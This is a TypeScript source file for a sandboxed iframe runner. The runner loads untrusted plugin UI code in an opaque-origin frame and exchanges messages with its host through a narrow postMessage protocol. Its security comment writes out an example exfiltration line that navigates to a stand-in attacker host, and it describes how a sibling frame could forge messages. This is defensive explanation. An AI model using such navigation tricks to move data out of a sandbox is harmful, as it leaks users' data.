/**
 * Custom-node UI sandbox runner — runs INSIDE the sandboxed iframe (sandbox.html).
 *
 * SECURITY: the host loads this page in an iframe with `sandbox="allow-scripts"` and
 * NO `allow-same-origin`, so this document runs in a UNIQUE OPAQUE ORIGIN. Consequences:
 *   - It cannot read the app's localStorage / cookies / IndexedDB (different origin) —
 *     so untrusted package UI code can't exfiltrate API keys or flow passwords.
 *   - It cannot touch the parent DOM or reach window.__TAURI_INTERNALS__ (cross-origin).
 *   - sandbox.html's CSP `connect-src 'none'` blocks fetch / XHR / WebSocket / img / form /
 *     popup egress. NOT airtight: a browsing context may ALWAYS navigate ITSELF, and CSP
 *     fetch-directives don't govern navigations (`navigate-to` was never shipped) — so
 *     `location.href = 'https://attacker/?d=' + ...` issues a real GET that this sandbox can't
 *     block. Treat the frame as a potential egress point for its OWN node.data; that's why we
 *     never put app-wide secrets here (resolved constants/keys flow through ctx.getConstant at
 *     RUNTIME, never into node.data).
 * The package UI renders its config form here and talks to the host only through the
 * narrow postMessage protocol below (node data in, data-change/height out).
 *
 * Protocol (window.postMessage):
 *   host → here: { __oaiybox: 'init',  code, nodeId }     // compile + mount the UI once
 *                { __oaiybox: 'props', data, selected }    // (re)render with node data
 *   here → host: { __oaiybox: 'boot' }                     // page is alive
 *                { __oaiybox: 'ready', ok }                // component loaded (or not)
 *                { __oaiybox: 'dataChange', updates }      // onDataChange from the UI
 *                { __oaiybox: 'height', px }               // content height for sizing
 */
import React from 'react';
import * as ReactDOM from 'react-dom';
import { createRoot, type Root } from 'react-dom/client';
import * as jsxRuntime from 'react/jsx-runtime';

interface UIProps {
  id: string;
  data: Record<string, unknown>;
  selected?: boolean;
  onDataChange?: (updates: Record<string, unknown>) => void;
}

// The externals the package UI was compiled against (customNodeCompiler maps
// react / react-dom / react/jsx-runtime → __PLUGIN_GLOBALS__.*). We deliberately expose
// ONLY React/ReactDOM/JSX here — never ReactFlow, Monaco, Tauri, or app internals.
(window as unknown as { __PLUGIN_GLOBALS__: unknown }).__PLUGIN_GLOBALS__ = {
  React,
  ReactDOM,
  ReactJSXRuntime: jsxRuntime,
};

const post = (msg: Record<string, unknown>): void => {
  try {
    parent.postMessage({ __oaiybox: msg.type, ...msg }, '*');
  } catch {
    /* parent gone */
  }
};

let Component: React.ComponentType<UIProps> | null = null;
let root: Root | null = null;
let nodeId = '';
let lastProps: { data: Record<string, unknown>; selected?: boolean } = { data: {} };

function loadComponent(code: string, id: string): React.ComponentType<UIProps> | null {
  const globalName = `__CUSTOM_NODE_UI_${id.replace(/[^a-zA-Z0-9]/g, '_')}__`;
  // Defense-in-depth: even fully isolated, refuse code that doesn't carry the compiler
  // sentinel (raw/un-compiled source should never reach here).
  if (!code.includes(globalName)) return null;
  // eslint-disable-next-line no-new-func
  const fn = new Function(
    `${code}\nreturn typeof ${globalName} !== 'undefined' ? ${globalName} : undefined;`,
  );
  const exports = fn() as Record<string, unknown> | undefined;
  if (!exports || typeof exports !== 'object') return null;
  if (typeof exports.default === 'function') return exports.default as React.ComponentType<UIProps>;
  if (typeof exports[id] === 'function') return exports[id] as React.ComponentType<UIProps>;
  for (const k of Object.keys(exports)) {
    if (typeof exports[k] === 'function') return exports[k] as React.ComponentType<UIProps>;
  }
  return null;
}

function render(): void {
  if (!Component || !root) return;
  try {
    root.render(
      React.createElement(Component, {
        id: nodeId,
        data: lastProps.data,
        selected: lastProps.selected,
        onDataChange: (updates: Record<string, unknown>) => post({ type: 'dataChange', updates }),
      }),
    );
  } catch (e) {
    const el = document.getElementById('root');
    if (el) el.textContent = `custom node UI error: ${e instanceof Error ? e.message : String(e)}`;
  }
}

window.addEventListener('message', (ev: MessageEvent) => {
  // Only accept messages from the HOST frame. Sibling custom-node iframes are co-resident in the
  // top document and CAN postMessage to us (via top.frames[i] — allowed even cross-origin from an
  // opaque-origin sandbox); without this a hostile sibling could forge an `init` (run attacker
  // code via new Function) or `props` into THIS node's UI. The host always targets `parent`, so
  // legitimate messages have ev.source === window.parent. Mirrors the host-side ev.source check.
  if (ev.source !== window.parent) return;
  const msg = ev.data as { __oaiybox?: string; code?: string; nodeId?: string; data?: unknown; selected?: boolean };
  if (!msg || typeof msg !== 'object' || typeof msg.__oaiybox !== 'string') return;
  if (msg.__oaiybox === 'init') {
    nodeId = String(msg.nodeId ?? '');
    try {
      Component = loadComponent(String(msg.code ?? ''), nodeId);
    } catch {
      Component = null;
    }
    const el = document.getElementById('root');
    if (el) root = createRoot(el);
    if (Component) render();
    post({ type: 'ready', ok: !!Component });
  } else if (msg.__oaiybox === 'props') {
    lastProps = { data: (msg.data ?? {}) as Record<string, unknown>, selected: msg.selected };
    render();
  }
});

// Report content height so the host can size the iframe to its UI.
let lastH = 0;
const reportHeight = (): void => {
  const h = document.documentElement.scrollHeight;
  if (h !== lastH) {
    lastH = h;
    post({ type: 'height', px: h });
  }
};
try {
  new ResizeObserver(reportHeight).observe(document.documentElement);
} catch {
  /* older browser — host falls back to a default height */
}

post({ type: 'boot' });
